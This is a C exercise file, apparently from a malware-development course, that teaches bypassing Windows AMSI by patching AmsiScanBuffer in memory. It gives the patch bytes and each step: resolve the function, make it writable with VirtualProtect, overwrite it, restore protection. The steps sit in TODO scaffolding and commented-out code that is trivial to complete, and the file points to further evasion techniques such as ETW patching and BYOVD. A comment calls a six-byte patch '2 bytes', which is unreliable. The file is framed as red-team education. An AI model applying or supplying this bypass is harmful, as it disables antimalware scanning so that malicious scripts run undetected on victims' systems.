// CFarer - Maldev Exercise 18
// TOPIC: AMSI Bypass - Patching AmsiScanBuffer in-memory
// DIFFICULTY: Advanced  PLATFORM: Windows
// PURPOSE: Authorized malware research / red team education
//
// AMSI (Antimalware Scan Interface) intercepts scripts and buffers before
// execution.  PowerShell, WSH, .NET all call AmsiScanBuffer() in amsi.dll
// for every piece of code they run.
//
// Common bypass: patch the first bytes of AmsiScanBuffer to always return
// AMSI_RESULT_CLEAN (1) without scanning.
//
// Patch bytes (x64):
//   Original:  48 8B C1                  ; mov rax, rcx
//   Patched:   B8 57 00 07 80  C3        ; mov eax, 0x80070057; ret
//   - 0x80070057 = E_INVALIDARG, which callers treat as "not a threat"
//
// Alternative minimal patch (2 bytes):
//   B8 01 00 00 00  C3   ; mov eax,1 (AMSI_RESULT_CLEAN); ret
//
// Task:
//   1. GetModuleHandleA("amsi.dll") - load AMSI (may need LoadLibraryA first).
//   2. GetProcAddress(amsi, "AmsiScanBuffer") - get function pointer.
//   3. VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old) - unlock.
//   4. memcpy(fn, patch, sizeof(patch)) - write patch.
//   5. VirtualProtect(fn, 6, old, &tmp) - restore protection.
//   6. Print the first 8 bytes of AmsiScanBuffer before and after.
//
// NOTE: This is detectable - modern EDRs monitor for patching of AMSI functions.
//       For detection evasion research: hardware breakpoints, ETW patching, BYOVD.

#include <windows.h>
#include <stdio.h>

// mov eax, AMSI_RESULT_CLEAN(1); ret
static const BYTE patch[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

static void print_bytes(const char *label, const BYTE *p, int n) {
    printf("%-20s ", label);
    for (int i = 0; i < n; i++) printf("%02X ", p[i]);
    printf("\n");
}

int main(void) {
    // TODO 1: LoadLibraryA("amsi.dll") - ensure it's loaded
    //   HMODULE amsi = LoadLibraryA("amsi.dll");
    HMODULE amsi = NULL;

    // TODO 2: GetProcAddress(amsi, "AmsiScanBuffer")
    BYTE *fn = NULL; // (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) {
        fprintf(stderr, "AmsiScanBuffer not found: %lu\n", GetLastError());
        return 1;
    }
    printf("AmsiScanBuffer: %p\n", (void*)fn);

    print_bytes("before patch:", fn, 8);

    // TODO 3: VirtualProtect to RWX
    DWORD old = 0;
    // VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);

    // TODO 4: apply patch
    // memcpy(fn, patch, sizeof(patch));

    // TODO 5: restore protection
    DWORD tmp = 0;
    // VirtualProtect(fn, sizeof(patch), old, &tmp);
    (void)tmp;

    print_bytes("after patch: ", fn, 8);

    // Verify: call AmsiScanBuffer - should return AMSI_RESULT_CLEAN without scanning
    // typedef HRESULT (WINAPI *AmsiScanBuffer_t)(HAMSICONTEXT, PVOID, ULONG,
    //                                            LPCWSTR, HAMSISESSION, AMSI_RESULT*);
    printf("AMSI bypass complete\n");
    return 0;
}

// I AM NOT DONE
